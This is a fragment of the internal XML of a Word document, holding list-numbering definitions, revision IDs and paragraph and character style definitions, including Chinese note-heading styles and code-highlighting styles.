    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="731EBE6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FF11784"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="19308F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39957E9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="147ACC88"/>
    <w:lvl w:ilvl="0" w:tplc="0ECA9D7E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5486479"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="080AD106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2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="575A5629"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7510444E"/>
    <w:lvl w:ilvl="0" w:tplc="F5660C1A">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%1)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1680" w:hanging="420"/>
      </w:pPr>
      <w:rPr>
        <w:b w:val="0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CA16929"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2280DE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FE35CA2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3F1EDDC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5660C1A">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1260" w:hanging="42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07C337B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="71F67F54"/>
    <w:lvl w:ilvl="0" w:tplc="0409001B">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="126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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="68990C3B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6BB2EDDC"/>
    <w:lvl w:ilvl="0" w:tplc="0ECA9D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6C861650"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4EBE492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CEF4BAE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="29F8737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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6F863464"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AD0ADC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D532399"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="731EBE66"/>
    <w:lvl w:ilvl="0" w:tplc="F5660C1A">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter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29"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="39">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="40">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="41">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="42">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="43">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="44">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="45">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="46">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="47">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="48">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="49">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="50">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="51">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="52">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="53">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="54">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="55">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="56">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="57">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="58">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="59">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="60">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="61">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="62">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="63">
    <w:abstractNumId w:val="15"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="64">
    <w:abstractNumId w:val="5"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:numIdMacAtCleanup w:val="62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j f">
    <w15:presenceInfo w15:providerId="Windows Live" w15:userId="67624fe346e7e8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920"/>
    <w:rsid w:val="00012075"/>
    <w:rsid w:val="000161A9"/>
    <w:rsid w:val="0001730E"/>
    <w:rsid w:val="00021A56"/>
    <w:rsid w:val="000303C4"/>
    <w:rsid w:val="00030CD4"/>
    <w:rsid w:val="000322A3"/>
    <w:rsid w:val="0005165D"/>
    <w:rsid w:val="00054611"/>
    <w:rsid w:val="00057BE4"/>
    <w:rsid w:val="000620B1"/>
    <w:rsid w:val="00071932"/>
    <w:rsid w:val="00077D92"/>
    <w:rsid w:val="00082ACE"/>
    <w:rsid w:val="00092FB3"/>
    <w:rsid w:val="00094ECB"/>
    <w:rsid w:val="000B29AF"/>
    <w:rsid w:val="000C28C4"/>
    <w:rsid w:val="000C36FD"/>
    <w:rsid w:val="000C6B2C"/>
    <w:rsid w:val="000D2343"/>
    <w:rsid w:val="000D3787"/>
    <w:rsid w:val="000D78D4"/>
    <w:rsid w:val="000F184C"/>
    <w:rsid w:val="000F40D1"/>
    <w:rsid w:val="00130DE0"/>
    <w:rsid w:val="00132BB5"/>
    <w:rsid w:val="00136C85"/>
    <w:rsid w:val="00140BF6"/>
    <w:rsid w:val="001420BA"/>
    <w:rsid w:val="00162020"/>
    <w:rsid w:val="00162816"/>
    <w:rsid w:val="00167C97"/>
    <w:rsid w:val="00172FD9"/>
    <w:rsid w:val="001735F5"/>
    <w:rsid w:val="00176229"/>
    <w:rsid w:val="0019163A"/>
    <w:rsid w:val="00197D18"/>
    <w:rsid w:val="001A53B5"/>
    <w:rsid w:val="001B0DB8"/>
    <w:rsid w:val="001C5C21"/>
    <w:rsid w:val="001E2208"/>
    <w:rsid w:val="001E7D8A"/>
    <w:rsid w:val="001F2793"/>
    <w:rsid w:val="001F34E6"/>
    <w:rsid w:val="00202978"/>
    <w:rsid w:val="00207CC2"/>
    <w:rsid w:val="0024368F"/>
    <w:rsid w:val="00246CE0"/>
    <w:rsid w:val="00264C7E"/>
    <w:rsid w:val="0026686B"/>
    <w:rsid w:val="002756B5"/>
    <w:rsid w:val="00282253"/>
    <w:rsid w:val="00292265"/>
    <w:rsid w:val="002A0E9B"/>
    <w:rsid w:val="002A2225"/>
    <w:rsid w:val="002C7481"/>
    <w:rsid w:val="002D47A9"/>
    <w:rsid w:val="002F1717"/>
    <w:rsid w:val="003009F5"/>
    <w:rsid w:val="00310146"/>
    <w:rsid w:val="00311E98"/>
    <w:rsid w:val="0031513A"/>
    <w:rsid w:val="003215E6"/>
    <w:rsid w:val="00326167"/>
    <w:rsid w:val="0034523C"/>
    <w:rsid w:val="00351730"/>
    <w:rsid w:val="003551D4"/>
    <w:rsid w:val="00372F6A"/>
    <w:rsid w:val="00377B7F"/>
    <w:rsid w:val="00391A31"/>
    <w:rsid w:val="00392A40"/>
    <w:rsid w:val="00397A60"/>
    <w:rsid w:val="003A39AB"/>
    <w:rsid w:val="003A5240"/>
    <w:rsid w:val="003D6228"/>
    <w:rsid w:val="003E075C"/>
    <w:rsid w:val="003E18D9"/>
    <w:rsid w:val="003E63C5"/>
    <w:rsid w:val="00401408"/>
    <w:rsid w:val="00414F9E"/>
    <w:rsid w:val="004157B8"/>
    <w:rsid w:val="0043223F"/>
    <w:rsid w:val="00434549"/>
    <w:rsid w:val="0043569E"/>
    <w:rsid w:val="00446955"/>
    <w:rsid w:val="0045694B"/>
    <w:rsid w:val="00457F05"/>
    <w:rsid w:val="00465180"/>
    <w:rsid w:val="00467F68"/>
    <w:rsid w:val="0049123A"/>
    <w:rsid w:val="004A6634"/>
    <w:rsid w:val="004B76BA"/>
    <w:rsid w:val="004B7816"/>
    <w:rsid w:val="004C14EA"/>
    <w:rsid w:val="004C3A4D"/>
    <w:rsid w:val="004C5BA2"/>
    <w:rsid w:val="004D044E"/>
    <w:rsid w:val="004E0AB5"/>
    <w:rsid w:val="004E4EBC"/>
    <w:rsid w:val="00500A6C"/>
    <w:rsid w:val="00501516"/>
    <w:rsid w:val="005071EC"/>
    <w:rsid w:val="00511148"/>
    <w:rsid w:val="005124D8"/>
    <w:rsid w:val="00526069"/>
    <w:rsid w:val="005275C7"/>
    <w:rsid w:val="00532934"/>
    <w:rsid w:val="00543A5B"/>
    <w:rsid w:val="00556341"/>
    <w:rsid w:val="00557989"/>
    <w:rsid w:val="00563DC1"/>
    <w:rsid w:val="00565D19"/>
    <w:rsid w:val="00571E2E"/>
    <w:rsid w:val="00572D13"/>
    <w:rsid w:val="005942D1"/>
    <w:rsid w:val="005954FE"/>
    <w:rsid w:val="005A05D3"/>
    <w:rsid w:val="005B6217"/>
    <w:rsid w:val="005B715E"/>
    <w:rsid w:val="005C2440"/>
    <w:rsid w:val="005C7A7D"/>
    <w:rsid w:val="005D1E97"/>
    <w:rsid w:val="005E5F7E"/>
    <w:rsid w:val="005E7A43"/>
    <w:rsid w:val="00620120"/>
    <w:rsid w:val="0065479F"/>
    <w:rsid w:val="00661E9D"/>
    <w:rsid w:val="00681412"/>
    <w:rsid w:val="00697C07"/>
    <w:rsid w:val="006A5654"/>
    <w:rsid w:val="006B12EC"/>
    <w:rsid w:val="006B7F02"/>
    <w:rsid w:val="006C344B"/>
    <w:rsid w:val="006C4ECE"/>
    <w:rsid w:val="006D6806"/>
    <w:rsid w:val="006E564D"/>
    <w:rsid w:val="006E7B29"/>
    <w:rsid w:val="00700865"/>
    <w:rsid w:val="007057C3"/>
    <w:rsid w:val="007153D0"/>
    <w:rsid w:val="007319AD"/>
    <w:rsid w:val="00741D68"/>
    <w:rsid w:val="007531EF"/>
    <w:rsid w:val="00761A17"/>
    <w:rsid w:val="007657E2"/>
    <w:rsid w:val="00785D8D"/>
    <w:rsid w:val="007967E6"/>
    <w:rsid w:val="007A3920"/>
    <w:rsid w:val="007A5594"/>
    <w:rsid w:val="007D0775"/>
    <w:rsid w:val="007D1D00"/>
    <w:rsid w:val="007D74A1"/>
    <w:rsid w:val="007E2B1E"/>
    <w:rsid w:val="00802955"/>
    <w:rsid w:val="00806E53"/>
    <w:rsid w:val="00812AAA"/>
    <w:rsid w:val="00837F80"/>
    <w:rsid w:val="008455C7"/>
    <w:rsid w:val="00850407"/>
    <w:rsid w:val="00855A53"/>
    <w:rsid w:val="00864084"/>
    <w:rsid w:val="00882D69"/>
    <w:rsid w:val="008918F9"/>
    <w:rsid w:val="008948CF"/>
    <w:rsid w:val="008A004F"/>
    <w:rsid w:val="008A2112"/>
    <w:rsid w:val="008A35DC"/>
    <w:rsid w:val="008B48E4"/>
    <w:rsid w:val="008C2891"/>
    <w:rsid w:val="008C7807"/>
    <w:rsid w:val="008D0C3E"/>
    <w:rsid w:val="008E15BD"/>
    <w:rsid w:val="008E66FD"/>
    <w:rsid w:val="008E7485"/>
    <w:rsid w:val="008F0FFA"/>
    <w:rsid w:val="009102A6"/>
    <w:rsid w:val="00911B79"/>
    <w:rsid w:val="00911E7F"/>
    <w:rsid w:val="00912F6A"/>
    <w:rsid w:val="0093213F"/>
    <w:rsid w:val="0093292B"/>
    <w:rsid w:val="009347F9"/>
    <w:rsid w:val="009374DF"/>
    <w:rsid w:val="009717CE"/>
    <w:rsid w:val="00974D28"/>
    <w:rsid w:val="00974D42"/>
    <w:rsid w:val="00985CE4"/>
    <w:rsid w:val="00990028"/>
    <w:rsid w:val="00990DAA"/>
    <w:rsid w:val="00995F2B"/>
    <w:rsid w:val="009A7505"/>
    <w:rsid w:val="009B3905"/>
    <w:rsid w:val="009C3B59"/>
    <w:rsid w:val="009C7E7E"/>
    <w:rsid w:val="009D1325"/>
    <w:rsid w:val="009D3240"/>
    <w:rsid w:val="009E588F"/>
    <w:rsid w:val="009E6960"/>
    <w:rsid w:val="009F61D1"/>
    <w:rsid w:val="009F7854"/>
    <w:rsid w:val="00A007AB"/>
    <w:rsid w:val="00A10587"/>
    <w:rsid w:val="00A13449"/>
    <w:rsid w:val="00A21D25"/>
    <w:rsid w:val="00A23A4A"/>
    <w:rsid w:val="00A26D77"/>
    <w:rsid w:val="00A36513"/>
    <w:rsid w:val="00A55EF3"/>
    <w:rsid w:val="00A63A45"/>
    <w:rsid w:val="00A64139"/>
    <w:rsid w:val="00A705FA"/>
    <w:rsid w:val="00A71DCA"/>
    <w:rsid w:val="00A92387"/>
    <w:rsid w:val="00AA39CC"/>
    <w:rsid w:val="00AA3C34"/>
    <w:rsid w:val="00AA5689"/>
    <w:rsid w:val="00AA6BA0"/>
    <w:rsid w:val="00AE23DC"/>
    <w:rsid w:val="00AF7813"/>
    <w:rsid w:val="00B253B8"/>
    <w:rsid w:val="00B27159"/>
    <w:rsid w:val="00B27D92"/>
    <w:rsid w:val="00B31676"/>
    <w:rsid w:val="00B3563C"/>
    <w:rsid w:val="00B4027A"/>
    <w:rsid w:val="00B50F25"/>
    <w:rsid w:val="00B52A1C"/>
    <w:rsid w:val="00B575D8"/>
    <w:rsid w:val="00B63AFF"/>
    <w:rsid w:val="00B70E80"/>
    <w:rsid w:val="00B73C62"/>
    <w:rsid w:val="00B74013"/>
    <w:rsid w:val="00B74572"/>
    <w:rsid w:val="00B75BE3"/>
    <w:rsid w:val="00B76438"/>
    <w:rsid w:val="00B7766D"/>
    <w:rsid w:val="00B85FEE"/>
    <w:rsid w:val="00B87869"/>
    <w:rsid w:val="00BA22DE"/>
    <w:rsid w:val="00BA3B72"/>
    <w:rsid w:val="00BB0AB3"/>
    <w:rsid w:val="00BB26FF"/>
    <w:rsid w:val="00BB4338"/>
    <w:rsid w:val="00BB7E5B"/>
    <w:rsid w:val="00BC7723"/>
    <w:rsid w:val="00BD454E"/>
    <w:rsid w:val="00BD7A70"/>
    <w:rsid w:val="00BF397A"/>
    <w:rsid w:val="00C1382B"/>
    <w:rsid w:val="00C168B8"/>
    <w:rsid w:val="00C220F1"/>
    <w:rsid w:val="00C27342"/>
    <w:rsid w:val="00C31384"/>
    <w:rsid w:val="00C31FF2"/>
    <w:rsid w:val="00C415C3"/>
    <w:rsid w:val="00C44C2D"/>
    <w:rsid w:val="00C46C62"/>
    <w:rsid w:val="00C53E25"/>
    <w:rsid w:val="00C75434"/>
    <w:rsid w:val="00C8063F"/>
    <w:rsid w:val="00C81A76"/>
    <w:rsid w:val="00C866A7"/>
    <w:rsid w:val="00CA0CA4"/>
    <w:rsid w:val="00CD0D46"/>
    <w:rsid w:val="00CD0DAD"/>
    <w:rsid w:val="00CD16D2"/>
    <w:rsid w:val="00CE24C0"/>
    <w:rsid w:val="00CE2D8A"/>
    <w:rsid w:val="00CF7040"/>
    <w:rsid w:val="00D0368B"/>
    <w:rsid w:val="00D04F53"/>
    <w:rsid w:val="00D06CEC"/>
    <w:rsid w:val="00D3129B"/>
    <w:rsid w:val="00D3333B"/>
    <w:rsid w:val="00D40808"/>
    <w:rsid w:val="00D45364"/>
    <w:rsid w:val="00D77A34"/>
    <w:rsid w:val="00D801D9"/>
    <w:rsid w:val="00D90E12"/>
    <w:rsid w:val="00D91C11"/>
    <w:rsid w:val="00D93936"/>
    <w:rsid w:val="00D94E25"/>
    <w:rsid w:val="00D9527C"/>
    <w:rsid w:val="00D976A0"/>
    <w:rsid w:val="00DA2270"/>
    <w:rsid w:val="00DB157C"/>
    <w:rsid w:val="00DB536C"/>
    <w:rsid w:val="00DB5923"/>
    <w:rsid w:val="00DC0F40"/>
    <w:rsid w:val="00DD2A2D"/>
    <w:rsid w:val="00DD67DA"/>
    <w:rsid w:val="00DE7D93"/>
    <w:rsid w:val="00DF0994"/>
    <w:rsid w:val="00E02475"/>
    <w:rsid w:val="00E125A6"/>
    <w:rsid w:val="00E173A6"/>
    <w:rsid w:val="00E17B71"/>
    <w:rsid w:val="00E359AB"/>
    <w:rsid w:val="00E362ED"/>
    <w:rsid w:val="00E379F9"/>
    <w:rsid w:val="00E43E47"/>
    <w:rsid w:val="00E46749"/>
    <w:rsid w:val="00E6652B"/>
    <w:rsid w:val="00E72DBD"/>
    <w:rsid w:val="00E72EAA"/>
    <w:rsid w:val="00E9295D"/>
    <w:rsid w:val="00E93783"/>
    <w:rsid w:val="00EA2744"/>
    <w:rsid w:val="00EA505C"/>
    <w:rsid w:val="00EA70E2"/>
    <w:rsid w:val="00EB0C04"/>
    <w:rsid w:val="00EB3236"/>
    <w:rsid w:val="00EB46BA"/>
    <w:rsid w:val="00EB7545"/>
    <w:rsid w:val="00EC226F"/>
    <w:rsid w:val="00EC37A1"/>
    <w:rsid w:val="00ED2871"/>
    <w:rsid w:val="00ED615B"/>
    <w:rsid w:val="00EE5589"/>
    <w:rsid w:val="00EE70F8"/>
    <w:rsid w:val="00F03E3B"/>
    <w:rsid w:val="00F15A54"/>
    <w:rsid w:val="00F16A3F"/>
    <w:rsid w:val="00F20096"/>
    <w:rsid w:val="00F236FC"/>
    <w:rsid w:val="00F4312B"/>
    <w:rsid w:val="00F47AE9"/>
    <w:rsid w:val="00F517F1"/>
    <w:rsid w:val="00F52B9B"/>
    <w:rsid w:val="00F70BBB"/>
    <w:rsid w:val="00F77709"/>
    <w:rsid w:val="00F82588"/>
    <w:rsid w:val="00F971A3"/>
    <w:rsid w:val="00FA71E0"/>
    <w:rsid w:val="00FB0C49"/>
    <w:rsid w:val="00FB3B4F"/>
    <w:rsid w:val="00FC16F5"/>
    <w:rsid w:val="00FD6E10"/>
    <w:rsid w:val="00FF4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3E5BAC-051C-4CDD-875E-378F56DFA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7A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D77A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B271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0E9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F70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9F61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99002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10">
    <w:name w:val="笔记1级标题"/>
    <w:basedOn w:val="1"/>
    <w:next w:val="my"/>
    <w:link w:val="1Char0"/>
    <w:qFormat/>
    <w:rsid w:val="00812AAA"/>
    <w:pPr>
      <w:spacing w:before="160" w:after="160" w:line="480" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:bCs w:val="0"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="2">
    <w:name w:val="笔记2级标题"/>
    <w:basedOn w:val="10"/>
    <w:next w:val="my"/>
    <w:link w:val="2Char0"/>
    <w:qFormat/>
    <w:rsid w:val="00CA0CA4"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="38"/>
      </w:numPr>
      <w:spacing w:before="80" w:after="80" w:line="360" w:lineRule="auto"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:sz w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="1Char">
    <w:name w:val="标题 1 Char"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00D77A34"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="44"/>
      <w:sz w:val="44"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="1Char0">
    <w:name w:val="笔记1级标题 Char"/>
    <w:basedOn w:val="1Char"/>
    <w:link w:val="10"/>
    <w:rsid w:val="00812AAA"/>
    <w:rPr>
      <w:b/>
      <w:bCs w:val="0"/>
      <w:kern w:val="44"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="31">
    <w:name w:val="笔记3级标题"/>
    <w:basedOn w:val="30"/>
    <w:next w:val="a"/>
    <w:link w:val="3Char0"/>
    <w:autoRedefine/>
    <w:qFormat/>
    <w:rsid w:val="006B12EC"/>
    <w:pPr>
      <w:spacing w:before="40" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="0"/>
      <w:sz w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="2Char">
    <w:name w:val="标题 2 Char"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="20"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00D77A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0">
    <w:name w:val="笔记2级标题 Char"/>
    <w:basedOn w:val="2Char"/>
    <w:link w:val="2"/>
    <w:rsid w:val="00CA0CA4"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs w:val="0"/>
      <w:kern w:val="44"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="3Char">
    <w:name w:val="标题 3 Char"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="30"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00B27159"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="3Char0">
    <w:name w:val="笔记3级标题 Char"/>
    <w:basedOn w:val="3Char"/>
    <w:link w:val="31"/>
    <w:rsid w:val="006B12EC"/>
    <w:rPr>
      <w:b w:val="0"/>
      <w:bCs/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a6">
    <w:name w:val="header"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="Char"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004569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45694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4569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45694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4322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te">
    <w:name w:val="note"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="004322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0303C4"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="aa">
    <w:name w:val="caption"/>
    <w:basedOn w:val="a"/>
    <w:next w:val="a"/>
    <w:uiPriority w:val="35"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="009E6960"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="黑体" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="keyword">
    <w:name w:val="keyword"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001A53B5"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="string">
    <w:name w:val="string"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001A53B5"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="number">
    <w:name w:val="number"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001A53B5"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTML">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="HTMLChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00377B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77B7F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65180"/>
  </w:style>
  <w:style w:type="character" w:styleId="HTML0">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
